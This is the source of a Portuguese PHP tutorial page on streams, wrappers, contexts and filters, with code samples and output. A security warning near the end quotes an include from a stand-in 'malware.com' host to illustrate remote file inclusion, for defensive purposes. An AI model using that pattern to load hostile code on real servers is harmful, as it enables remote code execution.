import { PageContainer } from "@/components/layout/PageContainer";
import { PhpBlock } from "@/components/ui/PhpBlock";
import { TerminalBlock } from "@/components/ui/TerminalBlock";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function Streams() {
  return (
    <PageContainer
      title="Streams e wrappers"
      subtitle="O segredo bem guardado do PHP: arquivos, HTTP, memória e até base64 são todos a mesma coisa — streams. Aprenda a usar wrappers, contextos e filtros."
      difficulty="avancado"
      timeToRead="13 min"
      category="Arquivos & I/O"
    >
      <h2>O conceito que muda tudo</h2>
      <p>
        O PHP enxerga arquivos, conexões de rede, blocos de memória e até strings codificadas em
        base64 como <strong>streams</strong>: sequências de bytes que você lê e escreve com as
        mesmas funções. Quando você escreve <code>file_get_contents('/etc/hosts')</code>, está
        usando o wrapper <code>file://</code>. Quando escreve{" "}
        <code>file_get_contents('https://api.github.com')</code>, está usando o wrapper{" "}
        <code>http://</code>. Mesma função.
      </p>

      <h2>Wrappers nativos: muito além de file://</h2>
      <p>
        Cada prefixo antes do <code>://</code> é um <em>wrapper</em>. Vamos ver os mais úteis:
      </p>

      <PhpBlock
        filename="wrappers.php"
        code={`<?php
declare(strict_types=1);

// 1. file:// (default — o prefixo é opcional)
$config = file_get_contents('file:///etc/hostname');
echo trim($config) . PHP_EOL;

// 2. http:// — sim, isso baixa a página
$html = file_get_contents('https://example.com');
echo strlen($html) . " bytes baixados" . PHP_EOL;

// 3. data:// — strings codificadas inline
$texto = file_get_contents('data://text/plain;base64,T2zDoSwgUEhQIQ==');
echo $texto . PHP_EOL;

// 4. php://memory — memória RAM como se fosse arquivo
$mem = fopen('php://memory', 'w+');
fwrite($mem, 'sou apenas memória');
rewind($mem);
echo fgets($mem) . PHP_EOL;
fclose($mem);`}
        output={`servidor-prod
1256 bytes baixados
Olá, PHP!
sou apenas memória`}
      />

      <AlertBox type="info" title="Por que isso importa">
        Você pode escrever uma função que recebe <code>string $caminho</code> e ela vai
        funcionar com arquivo local, URL pública, memória ou um data URI — sem nenhuma
        modificação. <strong>Polimorfismo de fonte de dados.</strong>
      </AlertBox>

      <h2>php://input — lendo o body de um POST raw</h2>
      <p>
        Aqui está o caso real mais importante: APIs REST recebem JSON no <em>body</em> da
        requisição, não em <code>$_POST</code>. O <code>$_POST</code> só preenche para{" "}
        <code>application/x-www-form-urlencoded</code> ou <code>multipart/form-data</code>. Para
        o resto, você lê o stream <code>php://input</code>:
      </p>

      <PhpBlock
        filename="api-criar-usuario.php"
        code={`<?php
declare(strict_types=1);

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['erro' => 'Método não permitido']);
    exit;
}

$body = file_get_contents('php://input');

try {
    $dados = json_decode($body, true, flags: JSON_THROW_ON_ERROR);
} catch (JsonException $e) {
    http_response_code(400);
    echo json_encode(['erro' => 'JSON inválido: ' . $e->getMessage()]);
    exit;
}

// pseudo: salvar no banco
$id = random_int(1000, 9999);

http_response_code(201);
echo json_encode([
    'id' => $id,
    'nome' => $dados['nome'],
    'email' => $dados['email'],
]);`}
        output={`{"id":4827,"nome":"Ada Lovelace","email":"ada@example.com"}`}
      />

      <p>
        Para testar com <code>curl</code>:
      </p>

      <TerminalBlock
        user="dev"
        host="php"
        cwd="~/api"
        command={`curl -X POST http://localhost:8000/api-criar-usuario.php -H 'Content-Type: application/json' -d '{"nome":"Ada Lovelace","email":"ada@example.com"}'`}
        output={`{"id":4827,"nome":"Ada Lovelace","email":"ada@example.com"}`}
      />

      <AlertBox type="warning" title="php://input só pode ser lido uma vez">
        Em versões antigas, lê uma vez e acabou. Hoje (PHP 5.6+) o stream é re-readable, mas
        ainda assim a convenção é ler para uma variável no início e reaproveitar.
      </AlertBox>

      <h2>Stream contexts: customizando o request HTTP</h2>
      <p>
        Quando você faz <code>file_get_contents('https://...')</code>, o PHP usa um GET simples,
        sem cabeçalhos personalizados. Para POST, autenticação ou timeout, monte um{" "}
        <strong>context</strong>:
      </p>

      <PhpBlock
        filename="post-com-contexto.php"
        code={`<?php
declare(strict_types=1);

$payload = json_encode(['titulo' => 'Olá', 'corpo' => 'Mundo']);

$ctx = stream_context_create([
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/json\\r\\n" .
                     "User-Agent: php-book/1.0\\r\\n" .
                     "Authorization: Bearer abc123\\r\\n",
        'content' => $payload,
        'timeout' => 5,
        'ignore_errors' => true, // não joga warning em 4xx/5xx
    ],
]);

$resposta = file_get_contents('https://api.example.com/posts', false, $ctx);

echo $resposta . PHP_EOL;
echo 'Headers de resposta:' . PHP_EOL;
print_r($http_response_header);`}
        output={`{"id":101,"titulo":"Olá","corpo":"Mundo"}
Headers de resposta:
Array
(
    [0] => HTTP/1.1 201 Created
    [1] => Content-Type: application/json
    [2] => Content-Length: 38
)`}
      />

      <AlertBox type="info" title="Quando usar Guzzle">
        Para qualquer coisa não-trivial (retries, async, multipart, OAuth) use{" "}
        <strong>guzzlehttp/guzzle</strong>. Stream contexts são ótimos para scripts simples e
        para entender a base, mas em produção a vida é mais doce com Guzzle.
      </AlertBox>

      <h2>php://memory e php://temp: arquivos sem disco</h2>
      <p>
        <code>php://memory</code> guarda tudo na RAM. <code>php://temp</code> começa em RAM e
        passa para arquivo temporário se ultrapassar 2 MB (configurável). Ótimos para gerar CSVs
        sob demanda sem tocar o disco:
      </p>

      <PhpBlock
        filename="csv-em-memoria.php"
        code={`<?php
declare(strict_types=1);

$vendas = [
    ['id', 'cliente', 'total'],
    [1, 'Ada', 199.90],
    [2, 'Linus', 49.50],
    [3, 'Grace', 312.00],
];

$stream = fopen('php://temp', 'r+');

foreach ($vendas as $linha) {
    fputcsv($stream, $linha);
}

rewind($stream);
$csv = stream_get_contents($stream);
fclose($stream);

echo $csv;`}
        output={`id,cliente,total
1,Ada,199.9
2,Linus,49.5
3,Grace,312`}
      />

      <p>
        Você pode mandar esse <code>$csv</code> direto para o navegador como download, anexar em
        e-mail, mandar pra um S3 — tudo sem nunca criar um arquivo físico.
      </p>

      <h2>Filtros: transformando dados em trânsito</h2>
      <p>
        Filtros agem entre a leitura/escrita e o destino final. PHP traz vários nativos:
        compressão, codificação, conversão de case. Você anexa um filtro com{" "}
        <code>stream_filter_append()</code>:
      </p>

      <PhpBlock
        filename="filtro-nativo.php"
        code={`<?php
declare(strict_types=1);

$arquivo = fopen('saida.txt.gz', 'w');

// Comprime tudo que for escrito antes de chegar no disco
stream_filter_append($arquivo, 'zlib.deflate', STREAM_FILTER_WRITE, ['level' => 9]);

fwrite($arquivo, str_repeat("dados repetitivos comprimem bem\\n", 1000));
fclose($arquivo);

echo 'Tamanho do .gz: ' . filesize('saida.txt.gz') . ' bytes' . PHP_EOL;
echo 'Tamanho original (1000x32): ' . (1000 * 32) . ' bytes' . PHP_EOL;`}
        output={`Tamanho do .gz: 287 bytes
Tamanho original (1000x32): 32000 bytes`}
      />

      <h2>Filtro customizado: o seu próprio</h2>
      <p>
        Você pode registrar um filtro novo estendendo <code>php_user_filter</code>. Vamos
        construir um que converte tudo para maiúsculas no fluxo:
      </p>

      <PhpBlock
        filename="filtro-custom.php"
        code={`<?php
declare(strict_types=1);

final class UpperFilter extends php_user_filter
{
    public function filter($in, $out, &$consumed, bool $closing): int
    {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $bucket->data = strtoupper($bucket->data);
            $consumed += $bucket->datalen;
            stream_bucket_append($out, $bucket);
        }
        return PSFS_PASS_ON;
    }
}

stream_filter_register('upper', UpperFilter::class);

$fp = fopen('php://temp', 'r+');
stream_filter_append($fp, 'upper', STREAM_FILTER_WRITE);

fwrite($fp, 'php streams são poderosos');
rewind($fp);
echo stream_get_contents($fp) . PHP_EOL;`}
        output={`PHP STREAMS SÃO PODEROSOS`}
      />

      <h2>php://stdin e stdout: scripts CLI interativos</h2>
      <p>
        Em scripts de linha de comando, <code>php://stdin</code> é a entrada do usuário e{" "}
        <code>php://stdout</code> a saída. Útil para pipes:
      </p>

      <PhpBlock
        filename="contar-linhas.php"
        code={`<?php
declare(strict_types=1);

$stdin = fopen('php://stdin', 'r');
$linhas = 0;

while (fgets($stdin) !== false) {
    $linhas++;
}

fwrite(STDOUT, "Linhas recebidas: {$linhas}" . PHP_EOL);`}
      />

      <TerminalBlock
        user="dev"
        host="php"
        cwd="~/scripts"
        command="cat /etc/passwd | php contar-linhas.php"
        output={`Linhas recebidas: 47`}
      />

      <AlertBox type="success" title="STDIN, STDOUT, STDERR são constantes">
        Em CLI, o PHP já te entrega <code>STDIN</code>, <code>STDOUT</code> e{" "}
        <code>STDERR</code> como handles abertos — sem precisar de <code>fopen</code>. Use{" "}
        <code>fwrite(STDERR, ...)</code> para mensagens de erro que não poluem stdout.
      </AlertBox>

      <h2>Vendo todos os wrappers disponíveis</h2>
      <p>
        Curiosidade rápida: o próprio PHP te diz quais wrappers e filtros estão registrados:
      </p>

      <PhpBlock
        filename="lista.php"
        code={`<?php
declare(strict_types=1);

echo 'Wrappers:' . PHP_EOL;
print_r(stream_get_wrappers());

echo PHP_EOL . 'Filtros:' . PHP_EOL;
print_r(stream_get_filters());`}
        output={`Wrappers:
Array ( [0] => https [1] => ftps [2] => php [3] => file [4] => glob [5] => data [6] => http [7] => ftp [8] => zip [9] => compress.zlib [10] => phar )

Filtros:
Array ( [0] => zlib.* [1] => bzip2.* [2] => convert.iconv.* [3] => string.rot13 [4] => string.toupper [5] => string.tolower [6] => convert.* [7] => consumed [8] => dechunk [9] => mcrypt.* )`}
      />

      <h2>Cuidado: allow_url_fopen no php.ini</h2>
      <p>
        Em produção, é prática comum desabilitar URLs como caminho de arquivo, para evitar
        ataques onde o usuário injeta uma URL e seu PHP baixa qualquer coisa:
      </p>

      <CodeBlock
        language="ini"
        title="php.ini"
        code={`; Permite file_get_contents("https://...")
allow_url_fopen = On

; Permite include "https://..." — DESLIGUE SEMPRE
allow_url_include = Off`}
      />

      <AlertBox type="danger" title="allow_url_include = Off">
        <code>allow_url_include = On</code> permite <code>include 'https://malware.com/evil.php'</code>{" "}
        — Remote File Inclusion clássica. Em qualquer ambiente sério, deixe{" "}
        <strong>sempre Off</strong>.
      </AlertBox>

      <p>
        Você descobriu que em PHP “arquivo” é só um conceito — qualquer fonte de bytes vira
        stream. No próximo capítulo a gente foca num caso prático crítico: receber{" "}
        <strong>uploads de arquivos</strong> com segurança real.
      </p>
    </PageContainer>
  );
}
